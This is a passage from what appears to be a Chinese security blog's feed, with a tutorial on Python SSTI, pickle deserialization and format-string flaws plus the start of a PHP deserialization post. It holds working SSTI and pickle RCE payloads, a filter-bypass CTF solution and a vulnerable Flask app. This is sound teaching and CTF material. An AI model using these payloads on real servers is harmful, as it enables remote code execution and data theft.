    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;本篇博客演示了文件包含漏洞的利用，包括本地文件包含和远程文件</summary>
      
    
    
    
    
    <category term="HackTheBox" scheme="http://example.com/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Python安全</title>
    <link href="http://example.com/2024/12/11/Python%E5%AE%89%E5%85%A8/"/>
    <id>http://example.com/2024/12/11/Python%E5%AE%89%E5%85%A8/</id>
    <published>2024-12-11T11:26:54.000Z</published>
    <updated>2024-12-13T12:57:33.164Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSTI注入"><a href="#SSTI注入" class="headerlink" title="SSTI注入"></a>SSTI注入</h1><p>SSTI（Server Side Template Injection，服务器端模板注入）：服务端接收攻击者的输入，将其作为 Web 应用模板内容的一部分。在进行目标编译渲染的过程中，执行了所插入的恶意内容。从而导致信息泄露、代码执行、GetShell 等问题，其影响范围取决于模版引擎复杂性。</p><p>模板引擎和渲染函数本身是没有漏洞的，该漏洞产生原因在于模板可控引发代码注入，凡是使用模板的地方都可能会出现 SSTI 的问题。</p><p>不同模版引擎对应不同的解析符号：<br><img src="/../images/Pasted%20image%2020241211204556.png"></p><p>如何判断是否存在SSTI注入？</p><ul><li>提交的数据如果在页面中有显示，即可进行SSTI测试。</li><li>根据该模版引擎的解析符号，尝试注入简单的模板表达式，比如 <code>&#123;&#123; 7*7 &#125;&#125;</code>，观察页面是否直接返回表达式结果。</li><li>正常情况下，用户输入应当被视为普通文本，不应执行其中的任何代码。如果输入 <code>&#123;&#123; 7*7 &#125;&#125;</code> 被解析为 <code>49</code>，说明服务器将输入当成了代码，而不是普通文本，就说明该页面存在 SSTI 注入。</li></ul><p>自动化工具：<a href="https://github.com/vladko312/SSTImap">https://github.com/vladko312/SSTImap</a></p><h2 id="Python对象的魔术方法"><a href="#Python对象的魔术方法" class="headerlink" title="Python对象的魔术方法"></a>Python对象的魔术方法</h2><figure class="highlight asciidoc"><table><tr><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-emphasis">__class__</span>：类的一个内置属性，表示实例对象的类。<br><br><span class="hljs-emphasis">__base__</span>：类型对象的直接基类。<br><br><span class="hljs-emphasis">__bases__</span>：类型对象的全部基类，以元组形式，类型的实例通常没有属性 。<br><br><span class="hljs-emphasis">__mro__</span> ：解析方法调用的顺序；此属性是由类组成的元组，在方法解析期间会基于它来查找基类。<br><br><span class="hljs-emphasis">__subclasses__</span>()：返回这个类的子类集合，每个类都保留一个对其直接子类的弱引用列表。该方法返回一个列表，其中包含所有仍然存在的引用。列表按照定义顺序排列。<br><br><span class="hljs-emphasis">__init__</span>：初始化类，返回的类型是function。<br><br><span class="hljs-emphasis">__globals__</span>：使用方式是 函数名.<span class="hljs-emphasis">__globals__</span>获取function所处空间下可使用的module、方法以及所有变量。<br><br><span class="hljs-emphasis">__dic__</span>：类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的<span class="hljs-emphasis">__dict__</span>里。<br><br><span class="hljs-emphasis">__getattribute__</span>()：实例、类、函数都具有的<span class="hljs-emphasis">__getattribute__</span>魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用<span class="hljs-emphasis">__getattribute__</span>方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。<br><br><span class="hljs-emphasis">__getitem__</span>()：调用字典中的键值，其实就是调用这个魔术方法，比如a[<span class="hljs-emphasis">&#x27;b&#x27;</span>]，就是a.<span class="hljs-emphasis">__getitem__</span>(<span class="hljs-emphasis">&#x27;b&#x27;</span>)<br><br><span class="hljs-emphasis">__builtins__</span> ：内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。<br><br><span class="hljs-emphasis">__import__</span> ：动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="hljs-emphasis">__import__</span>(<span class="hljs-emphasis">&#x27;os&#x27;</span>).popen(<span class="hljs-emphasis">&#x27;ls&#x27;</span>).read()]<br><br><span class="hljs-emphasis">__str__</span>()：返回描写这个对象的字符串，可以理解成就是打印出来。<br></code></pre></td></tr></table></figure><h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><p>下面的语句均拼接到模板渲染的接收参数处。</p><ol><li>查看当前环境中哪些子类可用。</li></ol><figure class="highlight handlebars"><table><tr><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241211212759.png"></p><ol start="2"><li>查找利用类索引。</li></ol><p>开启vscode的正则表达式模式，把逗号替换成\n，方便查看。找到利用类的索引，如</p><figure class="highlight actionscript"><table><tr><td class="code"><pre><code class="hljs actionscript">&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;os._wrap_close&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p>索引从 0 开始排序，根据环境不同，索引也不同，所以需要实际情况分析。</p><p>该类的索引是144：<br><img src="/../images/Pasted%20image%2020241211213043.png"></p><ol start="3"><li>查看该类所处空间下可使用的所有变量。</li></ol><figure class="highlight sqf"><table><tr><td class="code"><pre><code class="hljs sqf">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">144</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241211213808.png"></p><ol start="4"><li>构造利用类方法。</li></ol><figure class="highlight handlebars"><table><tr><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[144].__init__.__globals__.popen(<span class="hljs-name">&#x27;calc&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>显示没有这个属性：</p><p><img src="/../images/2be29370c82470255945ff4c2273df1b.png"></p><p>失败原因是Python 3.8 及以上，<code>dict</code> 明确不支持通过点号访问键，强制使用 <code>[&#39;key&#39;]</code> 的方式。</p><p>于是尝试改为以下格式：</p><figure class="highlight handlebars"><table><tr><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[133].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;calc&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>成功打开计算器：</p><p><img src="/../images/Pasted%20image%2020241211222236.png"></p><p>若是读取文件，要用 popen 命令，不能用system。因为 os.system 只是执行，无回显。而 popen 自带读取函数 read，可以得到执行命令的结果进行回显。</p><figure class="highlight handlebars"><table><tr><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[144].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a>基础payload</h2><figure class="highlight prolog"><table><tr><td class="code"><pre><code class="hljs prolog">//获得基类:<br><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">1</span>] # python3<br><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">2</span>] # python2<br>&#123;&#125;.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>] ().<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>] [].<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>] request.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">1</span>]<br>request.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">1</span>]<br><br>//文件操作 <br>//python3 已经移除了file。所以利用 file 子类文件读取只能在 python2 中用。<br>//找到file类 :<br>[].<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">40</span>] <br>//读文件 :<br>[].<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read() <br>//写文件 :<br>[].<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/tmp&#x27;</span>).write(<span class="hljs-string">&#x27;test&#x27;</span>)<br><br>//命令执行 <br>[].<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">144</span>].<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) <br><br>[].<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">144</span>].<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;id&#x27;</span>).read()<br></code></pre></td></tr></table></figure><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园</a></p><p><a href="https://www.suyou.world/index.php/2024/01/22/%e7%ac%ac70%e5%a4%a9%ef%bc%9aweb%e6%94%bb%e9%98%b2-python%e5%ae%89%e5%85%a8ssti%e6%a8%a1%e7%89%88%e6%b3%a8%e5%85%a5jinja2%e5%bc%95%e6%93%8e%e5%88%a9%e7%94%a8%e7%bb%95%e8%bf%87%e9%a1%b9%e7%9b%ae/">第70天：WEB攻防-Python安全&amp;SSTI模版注入&amp;Jinja2引擎&amp;利用绕过项目&amp;黑盒检测 – The-Starry-Sky</a></p><h2 id="实例分析-NewStar-CTF-2024-Week2-Web-复读机"><a href="#实例分析-NewStar-CTF-2024-Week2-Web-复读机" class="headerlink" title="实例分析-NewStar-CTF-2024-Week2-Web-复读机"></a>实例分析-NewStar-CTF-2024-Week2-Web-复读机</h2><ol><li>确定注入点是否存在 SSTI。</li></ol><p>输入 <code>&#123;&#123; 7*7 &#125;&#125;</code> 被解析为 <code>49</code>，说明服务器将输入当成了代码，而不是普通文本，就说明该页面存在 SSTI 注入。</p><ol start="2"><li>探索过滤规则。</li></ol><p>尝试注入 <code>&#123;&#123; "a".__class__&#125;&#125;</code> 来获取当前对象的类。页面输出异常信息（“bot 显示不喜欢上课”），说明 <code>__class__</code> 被过滤，<code>.</code> 可能也会被视为敏感字符，因为它能直接访问对象的属性。</p><p>遇到关键字被过滤的情况，可以利用字符串拼接等技巧绕过过滤，例如 <code>&#123;&#123;"a"['__cl'+'ass__']&#125;&#125;</code>，绕过 <code>__class__</code> 关键字限制。其中用<code>[]</code> 来绕过<code>.</code>过滤<br><img src="/../images/Pasted%20image%2020241029221640.png"><br>3. 利用 SSTI 获取敏感对象和方法。</p><p>SSTI 的目的是执行服务端代码，所以我们需要找到一个能操作系统命令的类。</p><p>对于大多数语言，<code>object</code> 是所有类的基类，我们可以通过访问 <code>object</code> 来找到各种可能的类。</p><p>可以通过表达式 <code>&#123;&#123;"a".['__cl'+'ass__']['__mro__'][1]&#125;&#125;</code>获取 <code>object</code> 类；<br><img src="/../images/Pasted%20image%2020241029222218.png"><br>然后通过 <code>&#123;&#123;"a".['__cl'+'ass__']['__mro__'][1]['__subc'+'lasses__']()&#125;&#125;</code> 获得所有子类的列表。</p><p><img src="/../images/Pasted%20image%2020241029222419.png"></p><ol start="4"><li>查找可利用的类。</li></ol><p>在获得 <code>subclasses()</code> 列表后，可以遍历其中的类，找到可能用于执行命令的类。在这个例子中，可以选择 <code>os._wrap_close</code>（通常位于索引 132，不同的 Python 版本和环境中，索引值可能有所不同）类。</p><p><code>os._wrap_close</code> 类中包含了可以帮助调用系统命令的方法，比如 <code>__init__</code> 中可以访问 <code>__globals__</code> 属性，进一步获取 Python 内置的 <code>eval</code> 函数。</p><ol start="5"><li>利用 <code>eval</code> 执行系统命令</li></ol><p>构造命令执行的表达式：</p><figure class="highlight scss"><table><tr><td class="code"><pre><code class="hljs scss">&#123;&#123;&quot;<span class="hljs-selector-tag">a</span>&quot;.<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__cl&#x27;</span>+<span class="hljs-string">&#x27;ass__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__mro__&#x27;</span>]</span><span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__subc&#x27;</span>+<span class="hljs-string">&#x27;lasses__&#x27;</span>]</span>()<span class="hljs-selector-attr">[132]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__init__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__globals__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;eval&#x27;</span>]</span>(&quot;__import__(&#x27;os&#x27;)<span class="hljs-selector-class">.popen</span>(&#x27;cat /flag&#x27;)<span class="hljs-selector-class">.read</span>()&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241029223458.png"></p><h1 id="Python-反序列化漏洞"><a href="#Python-反序列化漏洞" class="headerlink" title="Python 反序列化漏洞"></a>Python 反序列化漏洞</h1><h2 id="python-常用-反-序列化函数"><a href="#python-常用-反-序列化函数" class="headerlink" title="python 常用 (反) 序列化函数"></a>python 常用 (反) 序列化函数</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">pickle<span class="hljs-selector-class">.dump</span> (obj, file) : 将对象序列化后保存到文件<br>pickle<span class="hljs-selector-class">.load</span> (file) : 将文件序列化内容反序列化为对象<br>pickle<span class="hljs-selector-class">.dumps</span> (obj) : 将对象序列化成字符串格式的字节流<br>pickle<span class="hljs-selector-class">.loads</span> (bytes_obj) : 将字符串字节流反序列化为对象<br>PyYAML yaml<span class="hljs-selector-class">.load</span>()<br>JSON json<span class="hljs-selector-class">.loads</span>(s)<br>marshal<br></code></pre></td></tr></table></figure><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><figure class="highlight erlang"><table><tr><td class="code"><pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">reduce</span> <span class="hljs-params">()</span>：反序列化时调用。</span><br><span class="hljs-function"><span class="hljs-title">reduce_ex</span> <span class="hljs-params">()</span> ：反序列化时调用，同时都有的时候，执行 <span class="hljs-title">reduce_ex</span> ，不执行 <span class="hljs-title">reduce</span>。</span><br><span class="hljs-function"><span class="hljs-title">setstate</span> <span class="hljs-params">()</span> ：反序列化时调用（类似于 <span class="hljs-title">php</span> 的 <span class="hljs-title">isset</span> ）。</span><br><span class="hljs-function"><span class="hljs-title">getstate</span> <span class="hljs-params">()</span> ：序列化时调用。</span><br></code></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"> import pickle<br> import base64<br> <span class="hljs-keyword">from</span> flask import Flask, request<br> app = Flask(__name__)<br> ​<br> @app.route(<span class="hljs-string">&quot;/&quot;</span>)<br> def index():<br>     try:<br>        <span class="hljs-built_in"> user </span>= base64.b64decode(request.cookies.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;user&#x27;</span>))<br>        <span class="hljs-built_in"> user </span>= pickle.loads(user) #反序列化<br>         return <span class="hljs-string">&quot;Hello %s&quot;</span> %<span class="hljs-built_in"> user</span><br><span class="hljs-built_in"></span>     except:<br>         username = <span class="hljs-string">&quot;Guest&quot;</span><br>         return <span class="hljs-string">&quot;Hello %s&quot;</span> % username<br> ​<br> ​<br> <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>     app.<span class="hljs-built_in">run</span>(<br>         <span class="hljs-attribute">host</span>=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,<br>         <span class="hljs-attribute">port</span>=5000,<br>         <span class="hljs-attribute">debug</span>=<span class="hljs-literal">True</span><br>    )<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"> <span class="hljs-keyword">import</span> requests<br> <span class="hljs-keyword">import</span> pickle<br> <span class="hljs-keyword">import</span> os<br> <span class="hljs-keyword">import</span> base64<br> ​<br> <span class="hljs-keyword">class</span> exp(<span class="hljs-keyword">object</span>):<br>     def __reduce__(self):<br>         <span class="hljs-keyword">return</span> (eval, (&quot;__import__(&#x27;os&#x27;).system(&#x27;calc&#x27;)&quot;,))<br> ​<br> ​<br> e = exp()<br> s = pickle.dumps(e)<br> <span class="hljs-keyword">user</span>=base64.b64encode(s).decode()<br> print(<span class="hljs-keyword">user</span>)<br> response = requests.<span class="hljs-keyword">get</span>(&quot;http://127.0.0.1:5000/&quot;, cookies=dict(<span class="hljs-keyword">user</span>=base64.b64encode(s).decode()))<br></code></pre></td></tr></table></figure><h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><p><a href="https://xz.aliyun.com/t/3569?time__1311=n4+xnii=G=DQoiKDtbDs63xCq7KtYvNUKA00Qx">Python Web之flask session&amp;格式化字符串漏洞 - 先知社区</a></p><p>在 python 中，提供了 4 种格式化字符串方式。</p><ol><li><strong>%操作符</strong></li></ol><p>沿袭C语言中printf语句的风格：</p><figure class="highlight python-repl"><table><tr><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">name = <span class="hljs-string">&#x27;Bob&#x27;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">&#x27;Hello, %s&#x27;</span> % name</span><br>&quot;Hello, Bob&quot;<br></code></pre></td></tr></table></figure><ol start="2"><li><strong>string.Template</strong></li></ol><p>使用标准库中的模板字符串类进行字符串格式化：</p><figure class="highlight python-repl"><table><tr><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">name = <span class="hljs-string">&#x27;Bob&#x27;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> Template</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">t = Template(<span class="hljs-string">&#x27;Hey, $name!&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">t.substitute(name=name)</span><br>&#x27;Hey, Bob!&#x27;<br></code></pre></td></tr></table></figure><ol start="3"><li><strong>调用format方法</strong></li></ol><p>python3后引入的新版格式化字符串写法：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">&gt;&gt;&gt; <span class="hljs-type">name</span> , errno = <span class="hljs-string">&#x27;Bob&#x27;</span> , <span class="hljs-number">50159747054</span><br>&gt;&gt;&gt; <span class="hljs-string">&#x27;Hello, &#123;&#125;&#x27;</span>.format(<span class="hljs-type">name</span>)<br><span class="hljs-string">&#x27;Hello, Bob&#x27;</span><br>&gt;&gt;&gt; <span class="hljs-string">&#x27;Hey &#123;name&#125;, there is a 0x&#123;errno:x&#125; error!&#x27;</span>.format(<span class="hljs-type">name</span>=<span class="hljs-type">name</span>, errno=errno)<br><span class="hljs-string">&#x27;Hey Bob, there is a 0xbadc0ffee error!&#x27;</span><br></code></pre></td></tr></table></figure><p>但是这种写法存在安全隐患：</p><figure class="highlight python-repl"><table><tr><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">config = &#123;<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>: <span class="hljs-string">&#x27;12345&#x27;</span>&#125;</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">object</span>):</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python"> <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">  <span class="hljs-variable language_">self</span>.name = name</span><br><span class="hljs-meta prompt_">...</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">user = User(<span class="hljs-string">&#x27;joe&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">&#x27;&#123;0.__class__.__init__.__globals__[config]&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(user)</span><br>&quot;&#123;&#x27;SECRET_KEY&#x27;: &#x27;12345&#x27;&#125;&quot;<br></code></pre></td></tr></table></figure><p>如果用来格式化的字符串可以被控制，攻击者就可以通过注入特殊变量，带出敏感数据。</p><ol start="4"><li><strong>f-Strings</strong></li></ol><p>这是python3.6之后新增的一种格式化字符串方式，其功能十分强大，可以执行字符串中包含的python表达式，安全隐患可想而知。</p><figure class="highlight python-repl"><table><tr><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">a , b = <span class="hljs-number">5</span> , <span class="hljs-number">10</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">f&#x27;Five plus ten is <span class="hljs-subst">&#123;a + b&#125;</span> and not <span class="hljs-subst">&#123;<span class="hljs-number">2</span> * (a + b)&#125;</span>.&#x27;</span></span><br>&#x27;Five plus ten is 15 and not 30.&#x27;<br><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;id&quot;</span>)&#125;</span>&#x27;</span></span><br>uid=0(root) gid=0(root) groups=0(root)<br>&#x27;0&#x27;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SSTI注入&quot;&gt;&lt;a href=&quot;#SSTI注入&quot; class=&quot;headerlink&quot; title=&quot;SSTI注入&quot;&gt;&lt;/a&gt;SSTI注入&lt;/h1&gt;&lt;p&gt;SSTI（Server Side Template Injection，服务器端模板注入）：服务端接收攻击者</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化漏洞</title>
    <link href="http://example.com/2024/12/10/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/12/10/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-12-10T07:50:36.000Z</published>
    <updated>2024-12-11T05:42:17.208Z</updated>
    
    <content type="html"><![CDATA[<h1 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h1><p>在面向对象的程序设计中，<strong>类</strong>和<strong>对象</strong>是两个非常重要的概念。类是创建对象的基础，包含了对象的结构和功能。对象是类的实例，它拥有类中定义的属性和方法。</p><p>以下是一个PHP类：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestClass</span> //定义一个类</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-comment">//一个变量</span><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$variable</span> = <span class="hljs-string">&#x27;This is a string&#x27;</span>;<br><span class="hljs-comment">//一个方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PrintVariable</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;variable;<br>&#125;<br>&#125;<br><span class="hljs-comment">//创建一个对象</span><br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestClass</span>();<br><span class="hljs-comment">//调用一个方法</span><br><span class="hljs-variable">$object</span>-&gt;<span class="hljs-title function_ invoke__">PrintVariable</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>PHP 对属性或方法的访问控制，是通过在前面添加关键字实现的。</p><ul><li>public：公有的类成员可以在任何地方被访问。</li><li>protected：受保护的类成员只能被其自身以及其父类和子类访问。</li><li>private：私有的类成员只能被其定义所在的类访问</li></ul><p>访问控制修饰符不同，序列化后属性的长度和属性值会有所不同，如下所示：</p><ul><li>public：属性值会变成属性名。</li><li>protected：属性值会变成 <code>\x00*\x00属性名</code></li><li>private：属性值会变成 <code>\x00类名\x00属性名</code><br>其中：\x00表示空格。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$gender</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$age</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;id = <span class="hljs-string">&#x27;Hardworking666&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;gender = <span class="hljs-string">&#x27;male&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-string">&#x27;18&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">People</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;People&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Hardworking666&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot; * gender&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;male&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot; People age&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;18&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h1 id="PHP序列化和反序列化"><a href="#PHP序列化和反序列化" class="headerlink" title="PHP序列化和反序列化"></a>PHP序列化和反序列化</h1><p>序列化就是把对象转换为数组或字符串等格式。反序列化就是将数组或字符串等格式转换成对象。</p><p><img src="/../images/Pasted%20image%2020241210181426.png"><br>如何把一个对象序列化成一串字符串？举个例子：</p><p><img src="/../images/Pasted%20image%2020241115174639.png"></p><p>这里首先创建了一个类Demo。在实例化时，改变了其属性。PHP对象是存放在内存的堆空间段上的，PHP文件在执行结束的时候会将对象销毁。那么如果之后还要用到这个实例怎么办？解决方法就是先将它序列化存起来。<strong>序列化只序列属性，不序列方法</strong>。</p><p><img src="/../images/Pasted%20image%2020241115175445.png"></p><p>按顺序解释一下输出结果。<br>O: object；<br>4: 类名的长度；<br>2: 2个属性；<br>s:4 : 第一个属性名，是一个字符串string且长度为4；<br>s:3 : 第一个属性对应的值，是一个字符串string且长度为3；<br>s:3 : 第二个属性名，是一个字符串string且长度为3；<br>s:3 : 